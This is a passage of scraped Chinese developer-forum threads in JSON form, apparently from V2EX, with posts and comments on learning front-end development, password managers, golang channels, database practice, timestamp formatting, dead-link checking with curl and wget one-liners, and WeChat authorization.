斤。别傻了，你已经不是中学时代的你了，这样的时间周期已经不再适合这个时代的你了。</p>\n<p>一年的节假日总计起来大约有 115 个，折合工作时间(8h)至少有 115 * 8 = 920 个小时。这是什么概念啊！只要十年，你能拥有 2 个一万小时！根据所谓的「一万小时天才理论」你可是能成为两个领域的天才！然而这仅仅只需要努力 10 年！想想都觉得可怕。</p>\n<p>即使如此，你还天天期待着放假去玩而不是在假期更好的充电吗？</p>\n<p>无假是一种什么样的生活态度可能对每个人来说都不一样，但我可以告诉你当你过上无假的生活的时候，随时都可以有假。</p>\n<h2>事后</h2>\n<blockquote>\n<p>人生中的小梦想，总是要惦记的，无论你在年幼时候梦想着要实现什么，要做什么，请千万别觉得 Ta 幼稚，别瞧不起 Ta 。</p>\n</blockquote>\n<blockquote>\n<p>无论是过去的你，还是将来的你， Ta 终将是你自己的一部分，你理应为年幼的你负责，实现 Ta 一个又一个的小梦想。</p>\n</blockquote>\n<p>既然是年终总结本应该在年前发的，但我希望本文可以给大家在 17 年带来一点类似正能量的东西，类似鸡血一样的药剂，让大家在 17 年开一个好头，别忘记了自己的<strong>小梦想</strong>。同时希望大家在奋斗的人生上，别忘了身边的风景与亲人。即使有一句话是「你成功的速度需要大于你亲人老去的速度」，然而我觉得像我们这样大多数的普通人都是做不到的。</p>\n<p>17 年，我渴望与更多的人连接，渴望与看到这的你相识。让我们在未来的路上一起共勉。</p>\n<p>我是二哲，一个一不小心会写代码的伪作家。</p>\n<p><b>希望你今年过得比去年好一点<br>是因为有我</b></p>\n</div></div>"], "reply": "12", "tittle": "毫无色彩的二哲和他的巡礼之年", "comment": ["微信扫码说明暴露了什么 0v0", "随便刷到个人 GitHub 上 star 都比我多, 压力好大 - -", "那你被人误会强奸了谁？", "  题叶大大根本不需要 star 啊！:(  \r", " 小的项目也全是不起眼的项目", " \r", "你懂得 :)", "厉害", "这不是 vue 群里的二哲么", " 泥嚎啊 :)", "看楼主的教程入坑的 Vue,非常感谢", "哟～", "赞个", "🆙"]},
{"content": ["<div class=\"topic_content\">故事背景:作为一个大三狗，前段时间去一家事业单位实习做前端，可惜整个部门没人懂代码，自己也是半桶水，也做多少东西，感觉混不下去了决定辞职了。由于前几年各种浪，代码认识处于道理，原理自己都懂，但是就是敲不出来。前端的基础也是懂得一些 html,css ，做一些静态页面还是可以的。自己在慕课网看了视频课程学习，可是感觉自己还没学到些什么，不知道自己的程度到达怎么样了。\r<br>-------------------------------------------------------------------------------------------------------------------------------------------------\r<br>求大神教教怎样学习前端，还有没有一些前端学习的干货或者网站，书本。虚心求教。</div>"], "reply": "23", "tittle": "大三软工前端菜鸡求大神指教 T T，一心学习不再迷茫!", "comment": ["说实话初级后端的前端能力也比这个好。\r", "当然，要提升还是要做东西了，做什么看自己爱好了，做出来没人看也没事，总比什么都不干强。", "看你的描述其实是不愿意动手类型的，实践太少了，要敲代码才行的。找个项目做起来，模仿现在的东西也可以，实现不了的看别人的实现，然后自己再实现一遍。", "不要慌，首先《 Javascript 权威指南》这本圣经一定要好好看一遍，虽然确实很厚，但真的很经典很全面，而且以后你还会来重看的，这是基础。\r", "然后我觉得至少要会基本的 LInux 和一门后台语言（ PHP 或者 Python 或者 SpringMVC 比较容易入门），这个就理解基本原理就行。\r", "有了基础之后呢，就可以玩了啊，可以看看现在流行的各种前端框架自己做网站，也可以研究各种 github 上的写的好的 js 插件源码，就算是很简单的动画插件也可以，从简单入手。\r", "然后找实习啊，实践会有各种奇怪的需求，很锻炼能力。\r", "然后你就有自信投简历去了啊。", "那跟我一起学 es6+vuejs/react+webpack+nodejs 附带的 npm 工具比较好，前端技术栈已经变了，以前的技术懂了为什么不来掌握新的技术呢，", "说实话, 大学毕业那年我什么都不会.是真不会,看着视频教程上路的. 所以不要迷茫.", "首先把 css 学好，这是后端无法替代的，也是最让他们恶心的，这是你在公司立足的资本。其次，你现在连 js 都不熟，还没达到入门，所以先学好 js 吧。个人理解，不用学的太深，差不多懂一点了就看 es6 ，然后直接上 vue 或者 react 。就是要这样虐才能提升很快。", " 顶一个 《 Javascript 权威指南》必读的 读完受益匪浅", "还有 《 JavaScript 高级程序设计》", "首先，还是先想想毕业设计的作品，然后通过毕业设计作品，去学习。\r", "在就是找个技术公司实习，在那环境适应下工作把基础打好。", " 这话以前我还不信，最近实习了才发现是真的，前端框架变得很快，但是基本思想在那，他们也有一定的 js 基本功和常年后台开发带来的经验，但是 css 真是他们的软肋，写起来能把它们恶心死，哈哈哈哈哈哈哈哈，我们公司多少后台一开始都是因为 css 放弃前端了", "说心里话，通过你的描述，你就是 css 也未必玩得很通。。。前端变化演进的特别快，你现在这能力阶段 恐怕是。。。如果继续走前端， js 基础要打牢，然后马上进阶 vue react webpack nodejs", "  一起学习……希望一起成长", " 是啊，什么都不做就混吃等死了", " 被你发现了哈，就是动手太少了，所以才会虚", " 嗯嗯，看完基础就买起来", " 嗯嗯，一起学习哈，有队友感觉学起来也有动力， hhhh", " 我也又在看，在慕课网上面看的", " 我也觉得， css 的样式问题也很重要...JS 感觉效果很重要", " 我们学校的毕业设计要求不高，所以不用多大担心", "大三的话可以准备 3 、 4 月份的实习生招聘了，广州深圳 IT 公司招实习生基本上都是这个时候。", " 谢谢提醒哈，不过觉得自己能力还不大够，想要在学更多的东西再出去实习哈", "贴一个自己的前端学习路线 --> ", " 很感谢你啊，我会认真看的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://36kr.com/p/5062982.html\" rel=\"nofollow\">从 Gitlab 事件解读 IT 审计</a></p>\n</div></div>"], "reply": "3", "tittle": "从 Gitlab 事件解读 IT 审计", "comment": ["审计就是脱裤子放屁，头疼医脚", "这是审计没做好造成的\r", "不过这也说明了审计这活没啥产出，老板不忠实，很难干好", "创业公司，和大公司没法儿比"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>jQuery.AjaxFileUpload.js: <a href=\"https://github.com/jfeldstein/jQuery.AjaxFileUpload.js\" rel=\"nofollow\">https://github.com/jfeldstein/jQuery.AjaxFileUpload.js</a></h3>\n<h3>Ajaxfileupload.js ： <a href=\"https://github.com/hujiaxuan1995/Ajaxfileupload.js\" rel=\"nofollow\">https://github.com/hujiaxuan1995/Ajaxfileupload.js</a></h3>\n<h3>这两个好像不是同个东西吧，但是为何后者找不到官方 repo 呢，之前的项目用的就是后者然而是通过 csdn 认识的。</h3>\n<h3>顺便问问类似于百度云的批量上传用的啥插件？只能想到这一个耶。</h3>\n</div></div>"], "reply": "9", "tittle": "Ajaxfileupload.js 和 jQuery.AjaxFileUpload.js 不一样的吗？", "comment": ["。。。", "是不一样的,前短时间也遇到过...", " 还有人回复我，感动。。\r", "话说好气哦，怎么名字一样一样的。然后你后来查出个所以然了吗", "话说好气哦，怎么楼主的头像老有个小红点在那儿点不掉。根本忍不住……", " 你不是第一个说的，之前很流行的自己制作的啊。话说顺便看看我上面的问题啊", "百度开源了个 webuploader ，它公司内部应该就是用的这个", " ！！！谢谢你，我去 gh 看看", " 没有,现在又遇到个问题,这个插件没有 beforeSend 方法...可能要改用 formData 来上传图片了", " 哪个？？"]},
{"content": ["<div class=\"topic_content\"><div><a target=\"_blank\" href=\"https://gist.github.com/Sneezry/ac2da486db4d47378165264208ea1f79\">https://gist.github.com/Sneezry/ac2da486db4d47378165264208ea1f79</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>\r<br>居然被我自己找到了，哈哈， 2006 年的事了，当时的网名还叫 Snail 呢，哈哈哈哈</div>"], "reply": "23", "tittle": "写的第一个程序", "comment": ["GVBasic 还是培养了一大批程序员的，金远见当史上留名", "BASIC 都写了 250+行，还是比较佩服的", " @", " @", ",那个程序是做什么用的？后面有没有更新？\r", "会不会参加工作之后，就安全只会干活，都没有了自己的东西。", "数独嘛", "现在想想，怎么会有让程序员自己写行号的语言啊！光给变量起名就够烦的了……", "想起高中时，流行玩文曲星，那时候有个叫 HappyEO 的电子琴程序，我在它源码的基础上增加了点功能，并改了作者成自己的名字，在班上显摆\r", "然后有个家伙摸清了门道，直接把我的代码拷贝过去，作者改成他的名字，在班上其他人的文曲星中大量散布……", "哈哈，我那时行号是 5 、 10 、 15 这样按 5 的倍数来的，然后写着写着，发现需要插一行，就在那个行号后面加 1 ，比如 6 、 7 ，超过 4 行无解了，要么重写，要么 goto ，要么子程序", "竟然需要自己写行号", "这是 turing 的那位吧，看头像眼熟，再次感谢您的文档。", "额。。。我记得初中的时候用 nc1020 的时候，貌似这玩意有最大行数限制，写超过一次。。。", " 赞同，被文曲星代入的坑。", " 是指 Chrome 那个么，哈哈，不客气。其实当初草稿写好了就第一时间发到这里嘚瑟了 ", " 所以很多数据文件", "我的应该是在小霸王里面……", " 是的，有最大行限制的，我也写超过。", "我的在移动硬盘里面沉淀中。。", "文曲星真的是一波入坑，那个时候玩别人的游戏打不过直接改代码哈哈哈。\r", "\r", "后来还诞生了 Lava 来着，那更是一次井喷……", "<?php\r", "\r", "echo \"hello world\";\r", "\r", "?>", "NC1020 时代。。。\r", "\r", "当同学们都在我的培养下会写 GVBASIC 的时候，我已经入了 6502 汇编大坑\r", "\r", "想当年老子在文曲星圈里也是赫赫有名的\r", "\r", "好汉不提当年勇", "我在 04 年也写了一个小游戏，哈哈，源代码用英语本抄下来了好像还在", " 赫赫有名的话应该在论坛里见过你，最有名的肯定是 mj0011 ，当年微软给封为驱动神童，那时候在文曲星论坛 id 叫什么 qiqi", "哇，看到 BASIC 好亲切哦。我记得自己的第一个程序也是 BASIC 。", "感谢金远见，我也是写文曲星 BASIC 入门的，大概是 2003 年，天天上课写游戏玩游戏写修改器\r", "\r", "现在这公司怎样了？ Lee 姐姐还好吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请专业细致分析</p>\n</div></div>"], "reply": "122", "tittle": "为什么你们都在用 lastpass？？我在用 keeper，哪一个更好一点？", "comment": ["我用自己改进的，虽然每次需要登录的时候复制密码，不过自认为比密码管理软件靠谱多了，不存在泄露问题\r", "\r", "适合自己的就是最好的，我用 SafeInCloud 你说的这些我真用不习惯", "我用的 1password,文件存储在 dropbox 。", "LP+1P+EnPass 都有用过,互有优劣吧,感觉没一个能完全满意的\r", "\r", " #70 洋葱都倒闭了,马上就关停了", "以前用 lastpass ，手机使用极其蛋疼，我记得是非要付费订阅才能用移动端\r", "只能在手机浏览器上开网站，登录进去，找某个需要的条目密码，这体验简直爆炸\r", "后来 lastpass 被黑，有传言说是被脱裤了， 1password 就很鸡贼的蹦出来说我们今天半价销售！\r", "然后就怒买 1P ，使用 Dropbox 同步 iOS 、 OSX 、 windows 上的密码库\r", "非常好用，这是我花钱买软件买的最值得的一次\r", "ps ：授权文件很好看，金灿灿的\r", " ", "如果某些不需要同步的账号密码，就 keepassx 吧", "跟随凤凰卷用的 passwordstore", "一开始就用 keepassx ，习惯了", "lastpass 现在可以免费多端使用", "Enpass ，安卓用很舒服", "enpass ，数据自己掌握", "1Password 不折腾 因为贵所以信赖\r", "$_$", "   \r", "现在手机版 lastpass 很好用，也能用指纹解锁，在自带浏览器或者 chrome ， Safari 里指纹填写密码。\r", "而且 PC 端与手机端同步免费", "keepass 加 onedrive 也挺好用的", " CC 大人 万岁  万岁  万万岁  ！", "Keepass touch", "用 Safari 内置密码管理", "能两步验证就两步验证 基于时间验证码", " 打扰下~问个问题，用 1password 的话，把数据同步到 dropbox 这样是不是就可以不用订阅也可以使用- -。这个比较喜欢用这个，但是登录 1password 账号使用一定时间会提示付费订阅~", " 1Password 原本并不提供储存和同步的功能（经典版），需要用户自己解决，一般都是配合 Dropbox 或者 iCloud 来使用。\r", "但是现在出了每月 3 刀的订阅服务，云空间储存，必然也是多端自动同步了，不过要准备好钱包\r", "这软件非常鸡贼，买断式的经典版 win 平台只到 4.x 版本，订阅版的到 6.x 了……", "If you ’ re not subscribed to one of our subscription services, we do not suggest trying 1Password 6 just yet. Full OPVault and AgileKeychain support will be coming later in the year and we ’ ll have another announcement when we ’ re ready for you.", " 连 1password 的账户都不需要注册。"]},
{"content": ["<div class=\"topic_content\">对于 <a target=\"_blank\" href=\"https://www.v2ex.com/t/338015\" rel=\"nofollow\">https://www.v2ex.com/t/338015</a> 提出的问题，先说一下我自己的看法\r<br>为了什么而活呢，因人而异吧\r<br>首先是求生的本能，然后\r<br>为了满足身体和精神的需求\r<br>简单的说就是为了让身体和心舒服，被这个驱使\r<br>身体方面的，主要是温饱，没有病痛\r<br>精神方面的，跟生长环境，价值观，姿势水平有关\r<br>“赚很多钱然后在中国过人上人的生活”，“多走几个国家，去远的地方看看”，“为了自己和家人都舒服，过年带着自己一家和老婆一家一起出国旅游，飞机都坐公务舱，酒店都住五星级”，等等，这些都属于精神方面的\r<br>更简单的说就是七情六欲吧，虽然远多于“七”和“六”，并不是真的只有七和六，你懂的，成就感啊，虚荣心啊，求知欲啊，这心那心的\r<br>\r<br>是否可以将每个人看作是一个被 new 出来的 object 的实例，由于传入的参数的不同而导致了行为的不同\r<br>\r<br>说了这么多，我想说的是，能否建立一个“感情和欲望”模型，让程序活在这个模型下，程序的行为就是被这些情和欲驱使，嗯，我说的就是人工智能</div>", "<div class=\"topic_content\">你们有过割包皮的经历吗？\r<br>医生会给你开一些雌激素或者抑制勃起的药，来对抗性欲\r<br>你以为自己好色，实际上可能是程序针对你身体分泌的雄性激素所做的应对，处理\r<br>情绪也是，比如抑郁就是由于体内某种化学物质分泌不正常\r<br>而管理内分泌的是另一套程序\r<br>\r<br>感情啊，欲望啊，也许只是程序相互作用的结果</div>", "<div class=\"topic_content\">意识是什么\r<br>能否把它想象成程序运行时的内存？\r<br>好像不准确\r<br>JIT ？或者，会自己写代码的程序？</div>"], "reply": "18", "tittle": "由/t/338015“人为什么而活”而想到，能否构建“感情和欲望”的模型， AI，模拟人的行为，意识。语死早，但愿你们能看懂", "comment": ["关键的问题，“意识”是什么\r", "我们能意识到自己的存在，那猴子能意识到自己的存在吗，猪苟，鱼虾，蛤蟆呢\r", "假设虾，蛤蟆，无法意识到自己的存在，那虵们有意识吗，有吧\r", "如果有的话，那就是说，不能因为意识到自己的存在才叫“意识”", "假设，意识只是程序的运行状态，程序运行结束，意识消失", "如果程序和数据足够 模拟结果应该足以让真人 无法区分。\r", "在对海量数据进行分析 可以 对群体进行 一定时间上的 行为 /心理 预测，\r", "但是具体到人，预测总会在一些地方失效，\r", "AI 的情感 模型 会怎样处理 人类个体  在 行为 /情感某些方面 的随机性？产生这些随机性的 不一定是外部刺激，可能是人的思考等，，，对于这一类随机  AI 程序中 (内置随机数。。。。。逃）", "所以最终目是要做一个女朋友？ :doge:", " 让真人 无法区分 还不够，要有真正的意识\r", "人类个体 在 行为 / 情感 方面的随机性 也许并不是真随机，只是传入的参数不同，比如你吸入的空气中多了 /少了一粒灰尘", "AI 没有情感呀 虽然能够按照上下文推算给出答案 但是还是没有意识", "人绝对是计算机构造的虚拟物体，这也解释了为什么人死了后就烟消云散了，因为被 delete 了。", "黑镜忘了第几期了，有个类似的。根据各种社交模拟人表现。", "自我的概念（我执）+ 意识（表层意识+深层意识）+ 各种外部感官 = Living beings", " 这就有点属于玄学的范围了  现在的科技水平没法证明 涉及的论点 是伪还是真", "意思是人为什么不去死？大脑的机制已经是促使你遵循社会的默契并活下去啊。\r", "\r", "哪天你嗑药了疯起来了也许就做点什么危险的事就死了", " 我们的想法和行为会因为程序参数的不同而不同，我只是打个比方而已\r", " 我是在思考能否制造出具有意识的 AI 。没错，嗑药确实能改变你的想法和行为，可以把药物想象成参数，程序接受到不同的参数做出不同的响应", "不是参数这么简单啊。遗传因素肯定有影响的。有些人跟容易得一些精神疾病。\r", "你这种想法是决定论。很早就有的思想\r", "决定论否认了自由意志，所以作为存在主义者来说，我是不同意的\r", "按决定论来说，世上没有罪犯，因为他们都是身不由己。\r", "\r", "有人问人为什么活着？ I don't care. 地上捡了一百块，还要问为什么？买彩票中了一百万，还要问为什么？\r", "人生的意义要靠自己创造。人生来是无意义的，到死时一样不会有意义。什么国家，信仰，钱，名，利，人一死就什么都没了。我们短短几十年的人生在宇宙的眼里屁都不是。更何况宇宙又有什么意义，说不定只是高次元生命的玩具。\r", "\r", "生而无意义是一种自由，因为我不必被“有没有实现意义”而被评价。可这更是沉重的负担，因为我要不停给自己出题，去寻求人生的意义。 Gott ist tot.", "推荐你去看看攻壳机动队， 95 动画。\r", "少佐是人还是机器？连大脑都可以电子化的世界里，意识、生命又存在于何处？\r", "没有答案，思考本身就是答案——“我思故我在”是个耍赖逃避但有用的回答。", "想起之前看过一部叫西部世界的科幻美剧，里面的 AI 和真人就没什么区别 0v0", "（而且还有 AI 一直以为自己人类", "七情六欲的意义只是为了完成扎根在脑海深处的 \"物种繁衍\" 这条指令", "整个世界也许都是虚拟的呢，量子理论不确定性的一个合理解释是，由于虚拟出整个宇宙的计算机算力不够而做的 lazyload 处理。。。。"]},
{"content": ["<div class=\"topic_content\">主要还是 mysql ，公司 DBA 说把数据库用得最简单，存储过程也不让用，一定要放到代码逻辑里去。批量插入的每一条数据还需要查重的场景，代码处理有什么优雅一些的做法吗？建唯一索引，重复的就报错无法插入，这样的错误如果频繁的报会对数据库有影响吗(因为写程序毕竟是不想看到错误啊异常啥的)？</div>"], "reply": "9", "tittle": "关于数据库的存储过程 or 数据最佳实践？", "comment": ["你家 DBA 说的基本没错，现在的业务架构都是尽量不把逻辑处理放到 DB 侧，外键、存储过程等更是能不用坚决不用。\r", "\r", "这样做能够提高数据库性能，增加业务系统整体的灵活性和可扩展性。", " 但是代价是必须程序侧考虑并发与一致性问题", "insert ignore 可以批量插入不报错", " 显然关注点不在这，在如何保证程序可靠性上面", "题主给出的信息量不够，不管用不用存储过程，可靠性都不是问题。\r", "存储过程主要是为了提高复杂业务逻辑的性能，还有就是能屏蔽数据库结构设计的底层细节", "看看云栖的文章吧", "“需要查重”\r", "\r", "我怎么觉得，在通常情况下，使用 UNIQUE INDEX 是这件事的唯一方案", "就算业务逻辑再复杂再消耗大，都可以横向扩展解决。而数据库是很难横向扩展的。所以规模大了以后，瓶颈都是压在数据库上。本来压力很大的数据库，你还想多分工作给它？", " \r", "\r", "说错了\r", "\r", "刚试了一下, 在 PostgreSQL 上, 用 SERIALIZABLE 的事务，先 SELECT * FROM table WHERE v = value, 如果没有重复的再插入, 也可以保证唯一\r", "不一定非要用 UNIQUE INDEX\r", "\r", "当然, 我猜 SERIALIZABLE 事务的开销比 UNIQUE INDEX 大"]},
{"content": ["<div class=\"topic_content\">golang 这里有人用吗\r<br>\r<br>居然没有内置这种功能。。。\r<br>想到个办法，在此抛砖引玉\r<br>\r<br>刚试着弄了个，思路是制造一个链式的结构，\r<br>链上的每个元素对应一个 goroutine ，这个 goroutine\r<br>读取上一个节点发过来的数据扔到输出 channel 上，并转发给下一个。\r<br>输出 channel 阻塞就退出自己。（所以发送必须比接收慢）\r<br>而且链上有多少个节点，相当于多少容量的 buffer ，\r<br>无法确认消息送达到全部 channel\r<br>\r<br>type chaincast struct {\r<br>\tv interface{}\t\t\t//message payload.\r<br>\tout chan interface{}\t//message output channel\r<br>\tspawn chan&lt;- chaincast\t//send to this channel to spawn goroutine for chain element.\r<br>\tnext chan chaincast\t\t//channel for passing message to next\r<br>\tprev chan chaincast\t\t//channel for receiving message from prev\r<br>}\r<br>代码在这，可能有大 bug ：\r<br><a target=\"_blank\" href=\"https://play.golang.org/p/6D9wZ9Qnp8\" rel=\"nofollow\">https://play.golang.org/p/6D9wZ9Qnp8</a></div>"], "reply": "15", "tittle": "golang 单对多 channel ？", "comment": ["用途？", "以前用 golang 作业写过类似的东西。。", "    \r", "就是一个 goroutine 从网络或者标准输入或其他地方得到了一个消息， \r", "需要将其发给一组 goroutine 。\r", "\r", "这场景应该是比较常见吧。", "这个不是直接封装 chan 就好了么\r", "一个分发 chan ，一个 slice ，多个处理 chan\r", "分发 chan 里面直接循环往 slice 的 chan 塞东西就好了。。有啥问题么？", "没看懂用途", " \r", "\r", "按你 3 楼的描述，觉得起个 go 专门塞 Chan\r", "\r", "然后多个 go 取 Chan 的问题么", "就是 pub/sub 么...", " \r", "\r", "对，就是一个 go routine 负责从外部读取一些东西塞 chan ，\r", "其他一组 go routine 需要取 chan ，\r", "这组 go routine 随时有新增和退出。\r", "\r", "如果不用 mutex 。。。", "生产者和消费者模型，七牛的公开技术文档经常提到这个设计模式在内部项目的应用场景。", "chan 的 close 信号是广播的", "   我似乎理解你说的意思，就是元素为 chan 的 slice 。\r", "一开始就是这么弄的， 然后发现 2 个问题：\r", "新开的 goroutine 需要获取一个 chan 用来收消息；\r", "一个收消息的 goroutine 可能随时退出，然后这个 slice 大小只增不减。", " 这个问题很好解决啊\r", "在分发线程检测是否有无效 chan ，有的话从 slice 中删除就好了\r", "\r", "的确是典型的生产者 消费者问题，我一时没想起来", " 啊，看懂了\r", "但是这种东西最好的解决办法不就是 for 一遍塞 chan 吗……\r", "你可以把 slice 做成线程安全，每次线程退出自己删自己就好了", "sync.Cond", "我记得反射就可以了。。。性能应该会比用链式结构的好吧\r", "`reflect.Select`可以接收一个数组"]},
{"content": ["<div class=\"topic_content\">从 Clojure 微信群拉了一个群, \"FP 爱好者闲聊群\", 主要话题 Clojure, Haskell, Elixir, Scala, Scheme, Lisp 相关, ML, Elm, Reason, Eta, Lux, Idris 或者这些相关的方言也欢迎. 说了这么多, 其实现在主要都还是 Clojure 群的同学比较多 - -!\r<br>\r<br>有兴趣请在加我, 我拉进群. 注意, js 不算在内... 我的微信是 jiyinyiyong, 注意私信我你熟悉的语言是什么. 另外加 Clojure Haskell 之类微信群也可以帮忙.</div>"], "reply": "16", "tittle": "有兴趣聊函数式编程语言的进", "comment": ["欢迎直接给个 qrcode 扫码进群", " 故意增加一下门槛, 毕竟 FP 程序员少", "有 racket 的吗？🙃", "有 elixir ，竟没有 Erlang", "你的意思 JS 不是函数式语言？", " 有：）", " js 混合范式混合得厉害, 而且常常被当汇编用, 虽然在主流脚本语言当中算是只是函数式编程特性多的, 平常还是不把 js 往 FP 分类里丢.\r", "\r", " 群里 Elixir 人有一些, Erlang 不晓得有没有, 有兴趣可以加~\r", "\r", " 应该有吧, 没听他们聊", " js 还是标准的 c 风格语言么", " \r", " 同没有 erlang 表示不服… 我只有 erlang 稍微了解过", " 写 Elixir 的多多少少接触过 Erlang 啦, 楼上没看过 Elixir?", " ls 手滑 的确没看过 elixir", "比較喜歡 Haskell ，主要是類型系統比較好玩", "入过两年的 clojure 坑，现在被 Elixir 扶上岸。", " 居然上岸了, FP 不是巨坑么", "最近在撸 Elixir ，写起来挺有趣的"]},
{"content": ["<div class=\"topic_content\">答案可能不是绝对的, 请大家依据不同项目情况分享下自己的经验.\r<br>\r<br>针对一个 Web 项目, 数据库(PostgreSQL)储存时间戳的时候, 有人用 bigint, 有人用 timestamp.\r<br>\r<br>1. bigint\r<br>时间戳由后端(Node.js)生成, 填入数据库.\r<br>用的时候由前端 /后端来格式化.\r<br>时间戳为精确到毫秒的整数型, 前后端处理起来比较一致. 数据库想要操作可以用 to_char().\r<br>\r<br>2. timestamp\r<br>时间戳由数据库生成.\r<br>用的时候由数据库格式化或数据库格式为 UNIX 时间戳(可额外携带精度)交给前后端格式化.\r<br>timestamp 可选精度值.\r<br>想要输出 JavaScript 的时间戳 SQL 比较啰嗦, 比如 (EXTRACT(EPOCH FROM add_time) * 1000)::bigint\r<br>\r<br>在数据库有余力的情况下, 我目前的做法是数据库存为 timestamp, 输出 JavaScript 格式的时间戳, 由前端格式化.</div>"], "reply": "12", "tittle": "时间戳的格式化工作应该由谁(前端/后端/数据库)来完成?", "comment": ["目前都是 int 类型的时间戳，转换大部分是在返回给前端的时候做下，也偶尔让前端自己转\r", "主要是清晰，如果用数据库自带的 timestamp ，在转换的时候有时候会晕，本地时间， utc 时间，还有时区问题，所以我宁愿存储成 unix 样式的时间戳。", "时间戳格式化应该由前端完成，前端根据设计自行决定显示的格式", "支持 @", " 的说法，前台页面对于时间展示的格式要求多变，由前端进行处理，可以灵活一点。", " +1 XX 秒前  XX 时区，还是前端方便。", "前端", "展示端格式化，传输和计算都尽量保证统一的格式，比如用毫秒值", "unix 时间戳兼容性最高哇，毫秒时间戳支持的语言并不多。逻辑时间操作一般直接用 UTC 时间戳，避免时区和闰秒问题。显示部分当然谁要显示谁转成 local time 了，这样即便不同时区显示的时间也是一样的", "必然是前端转最好。", "一切格式化的工作尽量靠近前端，能靠多近就多近", "这个问题我也想了解和探讨一下\r", "\r", "可能场景不太一样\r", "我喜欢用数据库来做，因为我最担忧的是机器时间意外不准的情况下如何保证逻辑正确\r", "\r", "考虑到前端应用、后端应用都是多台机器，而数据库在不分库的情况下基本上请求都是打到同一台机器上，这样可以保证时间是统一的，不必过于担忧如果系统里各台机器时间不一致导致的逻辑 bug", "按说应该是前端来处理格式  \r", "\r", "但是很多时候我们也会加上格式化好的数据  主要是为了自己调试起来方便查看", "时间戳遇到闰秒会丢失信息量"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>做博客，有时会引用些外链；<br>\n但，有些时候，外链中部分回称为死链；</p>\n<p>网上搜了些、自己也写了个小工具，<br>\n去检测死链，发现准确度不很高；</p>\n<p>故此：再这儿求助下：<br>\n请求推荐一款检测网站链接有效性工具(大谢)；<br>\n若是开源小项目就更好了(比如用 Node)。</p>\n</div></div>"], "reply": "18", "tittle": "请求推荐一款检测网站链接有效性工具(谢)", "comment": [" 这样搜索出来的（或者 Google ），得到的推荐，目测不怎么靠谱；刚才就用“站长工具”跑了下，结果不精确。", "curl -s -o /dev/null -w \"%{http_code}\" ", "\r", "\r", "返回的值不是 200 可以判断为死链", "感谢，涨了点姿势。\r", "但若是，一个网站 or 网页中存在很多外链，需要先抓取，然后再逐一判断，这样做，看起来就不能很好的工作了。", "WordPress 有插件的，你搜搜", "$ sed -n 's/.*href=\"\\([^\"]*\\).*/\\1/p' file", "然后再接上 @", " 的 curl 应该就可以了", "file 是 html 文件，也可以管道连 curl 得到的源网页", " 我用的是 Hexo ，之后我瞅瞅有否；", " \r", "  改进了一下，加上-I, 只需要获取 header ，不需要下载整个页面\r", "\r", "curl -sI -o /dev/null -w \"%{http_code}\" ", "  目测这样无法判断  ", " 页面中包含的外链是否有效呢。", "wget -q ", " -O - | \\\r", "    tr \"\\t\\r\\n'\" '   \"' | \\\r", "    grep -i -o '<a[^>]\\+href[ ]*=[ \\t]*\"\\(ht\\|f\\)tps\\?:[^\"]\\+\"' | \\\r", "    sed -e 's/^.*\"\\([^\"]\\+\\)\".*$/\\1/g' \\\r", " | \\\r", " xargs -n1 -P 10 curl -o /dev/null --silent --head --write-out '%{url_effective};%{http_code};%{time_total};%{time_namelookup};%{time_connect};%{size_download};%{speed_download}\\n'\r", "\r", "拼凑了一下 stackoverflow 上的例子，能达到效果，@jeffjade 你可以试试。\r", "参考：\r", "\r", " 页面中的肯定要一个一个请求然后判断啊", " 13 楼的 @居然不起作用。。", " @", " 不好意思，是插件的问题", "有友链就上监控，外链就不用管了", " 所以我想请教的是，有没有比“站长工具”中 ", " 这个类似，但比他精确的工具"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我是一名高中生，在做一个关于程序员的研究性学习，需要收集一些数据来完成论文。因为生活在西北地区的五线小城市所以完全没有线下渠道调查，因此来 V2EX 收集一些数据...原本想要做有偿问卷，但高中生实在买不起 HHKB 之类的礼物（逃，因此只好作为无偿问卷收集。问卷大概需要占用 3~5 分钟时间完成。\n无论您填写问卷||帮助传播||提出建议，我都表示由衷的感谢。\n问卷地址： <a href=\"https://goo.gl/forms/usEttsKWDClvLAf42\" rel=\"nofollow\">https://goo.gl/forms/usEttsKWDClvLAf42</a></p>\n</div></div>"], "reply": "8", "tittle": "一个关于程序员的简单的调查问卷", "comment": ["我要是你们老师，这门课给你满分", "可以考虑在收集完成后，把统计结果和分析发给有兴趣的参与者。", " 恩，收集完成后会在这个主题中附加所收集到的数据", "感觉你那个隐藏问题是不是才是真正的问题-_-#", "大括号是否换行 写前端不换 写后端换行 (强迫症……", "感觉可以用这种方法钓鱼获得各种外部主机 /或 VPN 地址呢… 开玩笑……", " 好像确实是个好主意，要当心（逃", " 吓得我换了个公共 ss 进"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一些第三方应用或网站可以通过类似 QQ 、微博、微信之类的帐号登陆，我知道怎么在 QQ 、微博上取消对这些第三方的授权，但是不知道在微信上怎么取消。在网上搜索了一下，只找到怎么取消微信里游戏的授权，但是我好奇的不只是如何取消微信游戏的授权，而是查看并取消微信对所有第三方的授权。网上好像还有针对公众号的授权取消问题解决办法，唯独没有个人微信的？这么霸王条款?</p>\n</div></div>"], "reply": "10", "tittle": "怎么取消个人微信在第三方应用或网站的授权？", "comment": ["\r", "\r", "\r", "Let  me Baidu for you.", "没必要取消，因为微信授权只能拿到你的公开信息，如头像、昵称、性别、地区等，这些信息不需要加你好友，通过搜索你微信号就可以看到，所以不能称为隐私信息。\r", "然后你授权了的网站没办法用你的名义来干任何事情，比如发微信，发朋友圈，关注公众号之类的。\r", "\r", "微博、 QQ 需要取消授权是因为他们有一些权限，可以帮你发微博、关注别的微博账号、发说说、发日志。", "微信的那个不叫授权，是认证。 OpenID 和 OAuth 是不一样的哈楼主~", " 微信开发者只能拿到 二次生成的用户 ID ，所以并不能获取用户的微信号。\r", "\r", "推荐阅读： ", "\r", "\r", "选段 ：“在关注者与公众号产生消息交互后，公众号可获得关注者的 OpenID （加密后的微信号，每个用户对每个公众号的 OpenID 是唯一的。对于不同公众号，同一用户的 openid 不同）。公众号可通过本接口来根据 OpenID 